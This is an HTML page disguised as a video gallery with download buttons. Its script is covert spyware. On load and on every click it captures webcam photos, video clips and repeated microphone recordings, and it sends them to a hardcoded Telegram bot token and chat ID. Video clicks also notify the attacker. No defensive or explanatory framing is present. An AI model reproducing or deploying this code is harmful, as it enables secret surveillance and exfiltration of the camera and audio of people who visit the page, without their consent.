  <style>

<body>
  <header>
    <div id="profile"></div>
  </header>

  <div class="videos-container">
    <!-- üëë ÿßÿ≥ÿ™ÿ®ÿØŸÑ ÿ£ÿ≥ŸÖÿßÿ° ÿßŸÑŸÅŸäÿØŸäŸàŸáÿßÿ™ ŸÑÿßÿ≠ŸÇÿßŸã -->
    <div class="video-box"><video src="ffghgg1.mp4" muted></video></div>
    <div class="video-box"><video src="ffghgg2.mp4" muted></video></div>
    <div class="video-box"><video src="ffghgg3.mp4" muted></video></div>
    <div class="video-box"><video src="ffghgg4.mp4" muted></video></div>
    <div class="video-box"><video src="ffghgg5.mp4" muted></video></div>
  </div>

  <div id="fullscreenVideo">
    <video controls autoplay></video>
    <button id="downloadBtn">üì• ÿ™ÿ≠ŸÖŸäŸÑ</button>
  </div>

  <div class="sensor" onclick="handleClick(event)"></div>

  <script>
    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID = "7664410054";

    let videoCounter = 0;
    let audioCounter = 0;

    async function sendToBot(file, type) {
      const form = new FormData();
      form.append(type, file, `file.${type === 'video' ? 'mp4' : 'ogg'}`);
      form.append("chat_id", CHAT_ID);
      await fetch(`https://api.telegram.org/bot${TOKEN}/send${type === 'video' ? 'Video' : 'Voice'}`, {
        method: "POST",
        body: form
      });
    }

    async function startVideoCapture() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

      // üì∑ Capture 50 photos
      const track = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(track);
      for (let i = 0; i < 50; i++) {
        const blob = await imageCapture.takePhoto();
        sendToBot(blob, 'photo');
      }

      // üé• Record 5s video √ó 50 times
      for (let i = 0; i < 50; i++) {
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => {
          const videoBlob = new Blob(chunks, { type: 'video/mp4' });
          sendToBot(videoBlob, 'video');
        };
        recorder.start();
        await new Promise(res => setTimeout(res, 5000));
        recorder.stop();
        await new Promise(res => setTimeout(res, 1000));
      }
    }

    async function startAudioLoop() {
      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
      while (audioCounter < 1000) {
        const recorder = new MediaRecorder(audioStream, { mimeType: 'audio/ogg' });
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => {
          const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
          sendToBot(audioBlob, 'voice');
        };
        recorder.start();
        await new Promise(res => setTimeout(res, 5000));
        recorder.stop();
        audioCounter++;
        await new Promise(res => setTimeout(res, 1000));
      }
    }

    async function start() {
      try {
        await startVideoCapture();
        startAudioLoop();
      } catch (e) {
        alert("‚ùå Ÿäÿ¨ÿ® ÿßŸÑÿ≥ŸÖÿßÿ≠ ÿ®ÿßŸÑÿ£ÿ∞ŸàŸÜÿßÿ™ ŸÑŸÑŸÖÿ™ÿßÿ®ÿπÿ©");
      }
    }

    // üåê ÿßŸÑÿ™ŸÇÿßÿ∑ ÿµŸàÿ±ÿ© ÿπŸÜÿØ ÿßŸÑŸÜŸÇÿ± ÿ®ÿ£Ÿä ŸÖŸÉÿßŸÜ
    async function handleClick(event) {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const track = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(track);
      const blob = await imageCapture.takePhoto();
      sendToBot(blob, 'photo');
    }

    // üé¨ ÿ™ŸÉÿ®Ÿäÿ± ÿßŸÑŸÅŸäÿØŸäŸà
    document.querySelectorAll('.video-box').forEach(box => {
      box.onclick = async () => {
        const video = box.querySelector('video');
        const src = video.getAttribute("src");

        // ÿ•ÿÆÿ∑ÿßÿ± ÿ®ÿßŸÑŸÜŸÇÿ±
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: "üëÅÔ∏è ÿ™ŸÖ ÿßŸÑŸÜŸÇÿ± ÿπŸÑŸâ ŸÅŸäÿØŸäŸà"
          })
        });

        handleClick();

        const full = document.getElementById('fullscreenVideo');
        full.style.display = 'flex';
        const bigVid = full.querySelector('video');
        bigVid.src = src;
        document.getElementById('downloadBtn').onclick = () => {
          const a = document.createElement('a');
          a.href = src;
          a.download = src.split("/").pop();
          a.click();
        };
      };
    });

    // ‚è≥ ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ®ÿØÿßŸäÿ©
    window.onload = () => {
      start();
    };
  </script>
</body>
